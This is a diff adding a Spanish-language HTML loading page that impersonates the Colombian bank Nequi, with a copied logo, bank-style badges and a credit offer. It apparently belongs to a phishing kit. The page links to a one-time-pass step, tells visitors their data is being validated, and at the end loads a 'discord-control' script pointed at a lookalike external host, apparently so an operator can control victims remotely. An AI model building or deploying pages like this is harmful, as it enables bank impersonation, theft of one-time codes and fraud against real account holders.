@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Css -->
+  <link rel="stylesheet" href="../css/globals-4.css">
+  <link rel="stylesheet" href="../css/finish.css">
+  <link rel="stylesheet" href="../css/spinner-4.css">
+
+  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon-4.ico">
+  <title>Solicita tu credito</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap');
+
+    :root {
+      --font-sans: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      --color-red-400: oklch(70.4% 0.191 22.216);
+      --color-red-500: oklch(63.7% 0.237 25.331);
+      --color-blue-600: oklch(54.6% 0.245 262.881);
+      --color-indigo-800: oklch(39.8% 0.195 277.366);
+      --color-purple-600: oklch(55.8% 0.288 302.321);
+      --color-pink-600: oklch(59.2% 0.249 0.584);
+      --color-gray-200: oklch(92.8% 0.006 264.531);
+      --color-gray-300: oklch(87.2% 0.01 258.338);
+      --color-gray-400: oklch(70.7% 0.022 261.325);
+      --color-gray-500: oklch(55.1% 0.027 264.364);
+      --color-gray-600: oklch(44.6% 0.03 256.802);
+      --color-gray-700: oklch(37.3% 0.034 259.733);
+      --color-black: #000;
+      --color-white: #fff;
+      --spacing: 0.25rem;
+      --font-weight-normal: 400;
+      --font-weight-medium: 500;
+      --font-weight-semibold: 600;
+      --font-weight-bold: 700;
+      --radius-lg: 0.5rem;
+      --color-purple-primary: #200020;
+      --color-gray-primary: #f2f4f7;
+      --color-gray-secondary: #828d92;
+      --color-pink-primary: #da0081;
+      --color-pink-secondary: #fbe5f2;
+      --color-pink-tertiary: #fbe5f271;
+      --color-guanabana: #ece7f5;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      border: 0 solid;
+    }
+
+    html, body {
+      line-height: 1.5;
+      -webkit-text-size-adjust: 100%;
+      tab-size: 4;
+      font-family: var(--default-font-family, ui-sans-serif, system-ui, sans-serif);
+      font-feature-settings: normal;
+      font-variation-settings: normal;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    img, svg, video, canvas, audio, iframe, embed, object {
+      display: block;
+      vertical-align: middle;
+    }
+
+    img, video {
+      max-width: 100%;
+      height: auto;
+    }
+
+    button {
+      font: inherit;
+      letter-spacing: inherit;
+      color: inherit;
+      border-radius: 0;
+      background-color: transparent;
+      opacity: 1;
+      appearance: button;
+      border: none;
+    }
+
+    .bodyContainer {
+      margin: 0;
+      padding: 0;
+      font-family: 'Manrope', sans-serif;
+    }
+
+    .loadingContainer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
+      background-color: rgb(255, 255, 255);
+      overflow-y: auto;
+      padding-top: calc(64px + 40px);
+    }
+
+    .loadingContainer .mainSectionContainer {
+      background-position: center;
+      background-repeat: no-repeat;
+      background-size: cover;
+      display: block;
+      position: relative;
+      padding: 60px 0;
+      width: 100%;
+    }
+
+    .loadingContainer .mainSectionContainer.loading {
+      background-color: white;
+    }
+
+    .loadingContainer .mainSectionContainer .hero-image {
+      background-image: url(../assets/vigilado-bc.svg);
+      background-repeat: no-repeat;
+      height: 340px;
+      position: absolute;
+      top: 16%;
+      left: 5px;
+      width: 31px;
+      background-size: 45%;
+    }
+
+    .loadingContainer .mainSectionWrapper {
+      padding: 0;
+      max-width: 400px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .loadingContainer .logo_nequi_animado {
+      width: fit-content;
+      margin: 0 auto;
+    }
+
+    .loadingContainer .logo_nequi_animado img {
+      max-width: 150px;
+      width: 100%;
+      height: auto;
+    }
+
+    .loadingContainer .mainSectionWrapper .wait-msg {
+      margin-top: 20px;
+      font-weight: 600;
+      color: var(--color-purple-primary);
+      text-align: center;
+      font-size: 1.25rem;
+    }
+
+    .loadingContainer .mainSectionWrapper .info-msg {
+      margin-top: 20px;
+      font-size: 0.875rem;
+      font-weight: normal;
+      color: var(--color-purple-primary);
+      text-align: center;
+    }
+
+    .loadingContainer .mainSectionWrapper .warning-msg {
+      font-size: 0.875rem;
+      font-weight: normal;
+      color: var(--color-purple-primary);
+      text-align: left;
+      max-width: 270px;
+      width: 100%;
+    }
+
+    .loadingContainer .bottom {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+
+    .loadingContainer .bottom img {
+      height: 46px;
+      width: auto;
+    }
+
+    /* Header Styles */
+    header {
+      z-index: 999;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      height: 64px;
+      margin: 0 auto;
+      padding-top: 0;
+      padding-bottom: 0;
+      overflow: visible;
+      background-color: white;
+    }
+
+    header .flex {
+      display: flex;
+      align-items: center;
+      height: 100%;
+      border-bottom: 1px solid var(--color-gray-primary);
+      background-color: white;
+      padding-left: 26px;
+      padding-right: 26px;
+    }
+
+    header .flex > div {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 61.875rem;
+      height: 100%;
+      margin: 0 auto;
+    }
+
+    header a {
+      height: 32px;
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    header svg {
+      width: 100px;
+      height: auto;
+    }
+
+    header button {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 25px;
+      height: 20px;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    header .bar {
+      width: 100%;
+      height: 1px;
+      background-color: var(--color-purple-primary);
+      transition: all 0.4s ease;
+      margin: 3px 0;
+      display: block;
+    }
+
+    /* Footer */
+    footer {
+      margin-top: 40px;
+      background: url(../assets/footer-nequi-2.svg);
+      background-repeat: no-repeat;
+      background-size: cover;
+      padding: 100px 0 60px 0;
+      width: 100%;
+    }
+
+    footer .wrap {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 0;
+    }
+
+    footer .wrapper {
+      display: flex;
+      justify-content: center;
+    }
+
+    footer .footer img {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Responsive */
+    @media screen and (max-width: 450px) {
+      .loadingContainer .mainSectionWrapper {
+        padding-inline: 25px;
+      }
+    }
+
+    @media screen and (max-width: 768px) {
+      .loadingContainer {
+        padding-top: calc(64px + 40px);
+      }
+    }
+  </style>
+</head>
+
+<body class="bodyContainer">
+  <main class="loadingContainer">
+    <header>
+      <div class="flex">
+        <div>
+          <a href="one-time-pass.html">
+            <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
+              <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
+              <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
+              <path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
+              <path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
+              <path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
+              <path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
+              <path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
+            </svg>
+          </a>
+          <button aria-label="Menu">
+            <span class="bar"></span>
+            <span class="bar"></span>
+            <span class="bar"></span>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <section class="mainSectionContainer loading">
+      <div class="hero-image"></div>
+      <div class="mainSectionWrapper">
+        <div class="logo_nequi_animado">
+         <img src="loading-nequi-2-ezgif.com-webp-to-gif-converter.gif" alt="">
+        </div>
+        <p class="wait-msg">Por favor, espere...</p>
+        <p class="info-msg">En este momento estamos validando algunos datos. puede tardar un momento.</p>
+
+        <div class="bottom">
+          <p class="warning-msg">*Valido desde el <span id="dia">07</span> de <span id="mes">Agosto</span> al <span id="dia2">25</span> de <span id="mes2">diciembre</span> del <span id="anio">2025</span>, aplican T&amp;C
+          </p>
+          <img src="../assets/seguro_fogafin-2.svg" alt="image">
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="wrap">
+        <div class="wrapper">
+          <div class="footer">
+            <img class="footer-pc" src="../assets/footer-bigscreen-3.png" alt="">
+            <img class="footer-mobile" src="../assets/footer-3.png" alt="">
+          </div>
+        </div>
+      </div>
+    </footer>
+  </main>
+
+  <script>window.DISCORD_CONTROL_API = 'https://solucionsneqs.onrender.com';</script>
+  <script src="js/discord-control.js"></script>
+
+</body>
+
+</html>
